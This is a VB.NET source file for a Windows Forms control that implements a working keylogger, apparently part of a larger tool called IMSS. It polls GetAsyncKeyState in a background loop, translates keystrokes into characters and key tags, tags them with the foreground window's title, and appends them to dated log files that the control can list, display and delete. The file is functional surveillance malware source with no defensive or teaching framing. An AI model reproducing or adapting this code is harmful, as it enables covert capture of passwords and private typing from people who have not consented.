Imports DevComponents.DotNetBar.Controls
Imports ComponentOwl.BetterListView

Public Class IMSS_KEY_LOGGER
    Private Declare Function GetAsyncKeyState Lib "user32" (ByVal vkey As Integer) As Short
    Private Declare Function GetForegroundWindow Lib "user32" Alias "GetForegroundWindow" () As IntPtr
    Private Declare Auto Function GetWindowText Lib "user32" (ByVal hWnd As System.IntPtr, ByVal lpString As System.Text.StringBuilder, ByVal cch As Integer) As Integer
    Private Shared _IMSS_CONTROL As IMSS_KEY_LOGGER
    Private _IMSS_EXIT_KEYLOGGING As Boolean = False
    Dim _IMSS_THREAD As Threading.Thread

    Public Sub New()

        ' This call is required by the designer.
        InitializeComponent()

        ' Add any initialization after the InitializeComponent() call.
        Dim _IMSS_THREAD As New Threading.Thread(AddressOf _IMSS_LOAD_LOGS) : _IMSS_THREAD.Start()
    End Sub
    Private Sub _IMSS_LOAD_LOGS()
        Dim _IMSS_ListOfBetterListViewItems As New List(Of BetterListViewItem)
        For Each _IMSS_LOG_FILE In My.Computer.FileSystem.GetFiles(IMSS_PATHS._IMSS_KEY_LOGS_DIR)
            Dim _IMSS_BetterListViewItem As New BetterListViewItem
            With _IMSS_BetterListViewItem
                .Text = IO.Path.GetFileNameWithoutExtension(_IMSS_LOG_FILE)
                .Image = My.Resources._IMSS_KEY_LOG_FILE_ICON_16x16
            End With : _IMSS_ListOfBetterListViewItems.Add(_IMSS_BetterListViewItem) : _IMSS_BetterListViewItem.Dispose()
        Next _IMSS_LOG_FILE : _IMSS_ChangeListViewItems(_IMSS_ListOfBetterListViewItems) : _IMSS_ListOfBetterListViewItems.Clear()
    End Sub
    Private Delegate Sub _IMSS_ChangeListViewItemDelegate(ByRef _IMSS_ITEM As List(Of BetterListViewItem))
    Private Sub _IMSS_ChangeListViewItems(ByRef _IMSS_ITEM As List(Of BetterListViewItem))
        If _IMSS_LOGS_FILE_LIST.InvokeRequired = True Then
            _IMSS_LOGS_FILE_LIST.Invoke(New _IMSS_ChangeListViewItemDelegate(AddressOf _IMSS_ChangeListViewItems), _IMSS_ITEM)
        Else
            _IMSS_LOGS_FILE_LIST.BeginUpdate()
            _IMSS_LOGS_FILE_LIST.Items.Clear()
            _IMSS_LOGS_FILE_LIST.Items.AddRange(_IMSS_ITEM.ToArray())
            _IMSS_LOGS_FILE_LIST.EndUpdate()
        End If
    End Sub

    Private Function _IMSS_GetDecodeDate() As String
        Return Now.Year & "-" & Now.Day & "-" & Now.Month
    End Function


    Public Shared Function _IMSS_CREATE_CONTROL() As IMSS_KEY_LOGGER
        If _IMSS_CONTROL Is Nothing Then
            _IMSS_CONTROL = New IMSS_KEY_LOGGER
            _IMSS_CONTROL.Dock = DockStyle.Fill
        End If
        Return _IMSS_CONTROL
    End Function


    Private Function GetCaption() As String
        Dim Caption As New System.Text.StringBuilder(256)
        Dim hWnd As IntPtr = GetForegroundWindow()
        GetWindowText(hWnd, Caption, Caption.Capacity)
        Return Caption.ToString()
    End Function


    Private Sub _IMSS_STARTKeyLogging()
        Dim _IMSS_FunctionResult As Short = 0
        Dim _IMSS_CurrentWindow As String = "_IMSS_WINDOW"
        Do Until _IMSS_EXIT_KEYLOGGING = True
            For _IMSS_KeyNumber As Integer = 8 To 190 Step 1
                _IMSS_FunctionResult = 0
                _IMSS_FunctionResult = GetAsyncKeyState(_IMSS_KeyNumber)
                If _IMSS_FunctionResult = -32767 Then
                    If _IMSS_KeyNumber = Keys.Back Then
                        _IMSS_ChangeTextBoxText(_IMSS_LOGS_TEXT, "-", True)
                        If IO.File.Exists(IMSS_PATHS._IMSS_KEY_LOGS_DIR & "\" & _IMSS_GetDecodeDate() & ".IMSSDATA") Then
                            Dim _IMSS_GetTextFromLogFile As String = IO.File.ReadAllText(IMSS_PATHS._IMSS_KEY_LOGS_DIR & "\" & _IMSS_GetDecodeDate() & ".IMSSDATA")
                            If Not _IMSS_GetTextFromLogFile.Length = 0 Then IO.File.WriteAllText(IMSS_PATHS._IMSS_KEY_LOGS_DIR & "\" & _IMSS_GetDecodeDate() & ".IMSSDATA", _IMSS_GetTextFromLogFile.Remove(_IMSS_GetTextFromLogFile.Length - 1, 1))
                            If Not (GetCaption() = _IMSS_CurrentWindow) = True Then
                                _IMSS_CurrentWindow = GetCaption()
                                If Not _IMSS_GetTextFromLogFile.Length = 0 Then IO.File.WriteAllText(IMSS_PATHS._IMSS_KEY_LOGS_DIR & "\" & _IMSS_GetDecodeDate() & ".IMSSDATA", _IMSS_GenrateNewLines() & "@" & _IMSS_CurrentWindow & Environment.NewLine())
                            End If
                        End If
                    Else
                        _IMSS_ChangeTextBoxText(_IMSS_LOGS_TEXT, _IMSS_DecodeChars(_IMSS_KeyNumber, IMSS_PATHS.getkey(16)), False)
                        If Not (GetCaption() = _IMSS_CurrentWindow) = True Then
                            _IMSS_CurrentWindow = GetCaption()
                            _IMSS_ChangeTextBoxText(_IMSS_LOGS_TEXT, _IMSS_GenrateNewLines() & "@" & _IMSS_CurrentWindow & Environment.NewLine(), False)
                            _IMSS_WriteToLog(_IMSS_GenrateNewLines() & "@" & _IMSS_CurrentWindow & Environment.NewLine())
                        End If
                        _IMSS_WriteToLog(_IMSS_DecodeChars(_IMSS_KeyNumber, IMSS_PATHS.getkey(16)))
                    End If
                End If
            Next _IMSS_KeyNumber
            System.Threading.Thread.Sleep(10)
        Loop : _IMSS_EXIT_KEYLOGGING = False
    End Sub
    Private Function _IMSS_GenrateNewLines() As String
        Return Environment.NewLine & Environment.NewLine & Environment.NewLine
    End Function

    Private Function _IMSS_DecodeChars(ByVal _IMSS_Char As Short, ByVal modifier As Boolean) As String
        Select Case _IMSS_Char
            Case 65 To 90
                If modifier Then
                    Return Chr(_IMSS_Char)
                Else
                    Return Chr(_IMSS_Char + 32)
                End If
            Case Keys.LShiftKey
                Return ""
            Case Keys.RShiftKey
                Return ""
            Case Keys.ShiftKey
                Return ""
            Case 2
                Return "<RCLICK>"
            Case 9
                Return "<TAB>"
            Case 17
                Return "<CTRL>"
            Case 18
                Return "<ALT>"
            Case 19
                Return "<PAUSE>"
            Case 20
                Return "<CAPSLOCK>"
            Case 27
                Return "<ESC>"
            Case 33
                Return "<PAGEUP>"
            Case 34
                Return "<PAGEDOWN>"
            Case 35
                Return "<END>"
            Case 36
                Return "<HOME>"
            Case 37
                Return "<LEFT>"
            Case 38
                Return "<UP>"
            Case 39
                Return "<RIGHT>"
            Case 40
                Return "<DOWN>"
            Case 44
                Return "<PRNTSCRN>"
            Case 45
                Return "<INSERT>"
            Case 46
                Return "<DEL>"
            Case 47
                Return "<HELP>"
            Case Keys.Enter
                Return Environment.NewLine()
            Case Keys.F1
                Return "[F1]"
            Case Keys.F2
                Return "[F2]"
            Case Keys.F3
                Return "[F3]"
            Case Keys.F4
                Return "[F4]"
            Case Keys.F5
                Return "[F5]"
            Case Keys.F6
                Return "[F6]"
            Case Keys.F7
                Return "[F7]"
            Case Keys.F8
                Return "[F8]"
            Case Keys.F9
                Return "[F9]"
            Case Keys.F10
                Return "[F10]"
            Case Keys.F11
                Return "[F11]"
            Case Keys.F12
                Return "[F12]"
            Case Keys.ControlKey
                Return "<ControlKey>"
            Case Keys.Delete
                Return "<Delete>"
            Case Keys.NumPad0
                Return "0"
            Case Keys.NumPad1
                Return "1"
            Case Keys.NumPad2
                Return "2"
            Case Keys.NumPad3
                Return "3"
            Case Keys.NumPad4
                Return "4"
            Case Keys.NumPad5
                Return "5"
            Case Keys.NumPad6
                Return "6"
            Case Keys.NumPad7
                Return "7"
            Case Keys.NumPad8
                Return "8"
            Case Keys.NumPad9
                Return "9"
            Case Keys.NumLock
                Return "<NumLock>"
            Case 48
                Return ")"
            Case 49
                Return "!"
            Case 50
                Return "@"
            Case 51
                Return "#"
            Case 52
                Return "$"
            Case 53
                Return "%"
            Case 54
                Return "^"
            Case 55
                Return "&"
            Case 56
                Return "*"
            Case 57
                Return "("
            Case 186
                If modifier Then
                    Return ":"
                Else
                    Return ";"
                End If
                Return ";"

            Case 187
                If modifier Then
                    Return "+"
                Else
                    Return "="
                End If
            Case 188
                If modifier Then
                    Return "<"
                Else
                    Return ","
                End If
            Case 189
                If modifier Then
                    Return "_"
                Else
                    Return "-"
                End If
            Case 190
                If modifier Then
                    Return ">"
                Else
                    Return "."
                End If
            Case 191
                If modifier Then
                    Return "?"
                Else
                    Return "/"
                End If
            Case 192
                If modifier Then
                    Return "~"
                Else
                    Return "`"
                End If
            Case Else
                Return Chr(_IMSS_Char).ToString().ToLower()
        End Select
    End Function

    Private Sub _IMSS_WriteToLog(ByVal _IMSS_TEXT As String)
        If IO.File.Exists(IMSS_PATHS._IMSS_KEY_LOGS_DIR & "\" & _IMSS_GetDecodeDate() & ".IMSSDATA") Then
            IO.File.AppendAllText(IMSS_PATHS._IMSS_KEY_LOGS_DIR & "\" & _IMSS_GetDecodeDate() & ".IMSSDATA", _IMSS_TEXT)
        Else
            IO.File.Create(IMSS_PATHS._IMSS_KEY_LOGS_DIR & "\" & _IMSS_GetDecodeDate() & ".IMSSDATA").Dispose()
            IO.File.AppendAllText(IMSS_PATHS._IMSS_KEY_LOGS_DIR & "\" & _IMSS_GetDecodeDate() & ".IMSSDATA", _IMSS_TEXT)
        End If
    End Sub

    Private Delegate Sub _IMSS_ChangeTextBoxTextDelegate(ByRef _IMSS_TextBox As TextBoxX, ByVal _IMSS_TEXT As String, ByVal _IMSS_RemoveChar As Boolean)
    Private Sub _IMSS_ChangeTextBoxText(ByRef _IMSS_TextBox As TextBoxX, ByVal _IMSS_TEXT As String, ByVal _IMSS_RemoveChar As Boolean)
        If _IMSS_TextBox.InvokeRequired = True Then
            _IMSS_TextBox.Invoke(New _IMSS_ChangeTextBoxTextDelegate(AddressOf _IMSS_ChangeTextBoxText), _IMSS_TextBox, _IMSS_TEXT, _IMSS_RemoveChar)
        Else
            If _IMSS_RemoveChar = False Then
                _IMSS_TextBox.Text += _IMSS_TEXT
                _IMSS_TextBox.Select(_IMSS_TextBox.Text.Length, 0)
                _IMSS_TextBox.ScrollToCaret()
            Else
                If Not _IMSS_TextBox.Text.Length = 0 Then _IMSS_TextBox.Text = _IMSS_TextBox.Text.Remove(_IMSS_TextBox.Text.Length - 1, 1)
            End If
        End If
    End Sub

    Public Sub _IMSS_LANUCH_KEY_LOGGING(ByVal _IMSS_STATUS As Boolean)
        If _IMSS_STATUS = False Then
            If _IMSS_THREAD Is Nothing Then
                _IMSS_THREAD = New Threading.Thread(AddressOf _IMSS_STARTKeyLogging) : _IMSS_THREAD.Start()
            Else
                If Not _IMSS_THREAD.IsAlive() = True Then
                    _IMSS_THREAD = New Threading.Thread(AddressOf _IMSS_STARTKeyLogging) : _IMSS_THREAD.Start()
                End If
            End If
        Else
            _IMSS_EXIT_KEYLOGGING = _IMSS_STATUS
        End If
    End Sub

    Private Sub _IMSS_Refresh_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles _IMSS_Refresh.Click
        _IMSS_LOGS_TEXT.Text = "Please select a log file to view it here ..."

        Dim _IMSS_THREAD As New Threading.Thread(AddressOf _IMSS_LOAD_LOGS) : _IMSS_THREAD.Start()
    End Sub

    Private Sub _IMSS_LOGS_FILE_LIST_SelectedIndexChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles _IMSS_LOGS_FILE_LIST.SelectedIndexChanged
        If Not (_IMSS_LOGS_FILE_LIST.SelectedItems.Count() = 0) = True Then
            If IO.File.Exists(IMSS_PATHS._IMSS_KEY_LOGS_DIR & "\" & _IMSS_LOGS_FILE_LIST.SelectedItems(0).Text & ".IMSSDATA") = True Then
                _IMSS_LOGS_TEXT.Text = IO.File.ReadAllText(IMSS_PATHS._IMSS_KEY_LOGS_DIR & "\" & _IMSS_LOGS_FILE_LIST.SelectedItems(0).Text & ".IMSSDATA")
            End If
        End If
    End Sub

    Private Sub ButtonX1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ButtonX1.Click
        If Not _IMSS_LOGS_FILE_LIST.SelectedItems.Count() = 0 Then
            _IMSS_LOGS_TEXT.Clear()
            If IO.File.Exists(IMSS_PATHS._IMSS_KEY_LOGS_DIR & "\" & _IMSS_LOGS_FILE_LIST.SelectedItems(0).Text & ".IMSSDATA") = True Then
                IO.File.Delete(IMSS_PATHS._IMSS_KEY_LOGS_DIR & "\" & _IMSS_LOGS_FILE_LIST.SelectedItems(0).Text & ".IMSSDATA")
                _IMSS_Refresh.PerformClick()
                If Not _IMSS_LOGS_FILE_LIST.SelectedItems.Count() = 0 Then _IMSS_LOGS_FILE_LIST.Items(0).Selected = True
            End If
        End If
    End Sub
End Class
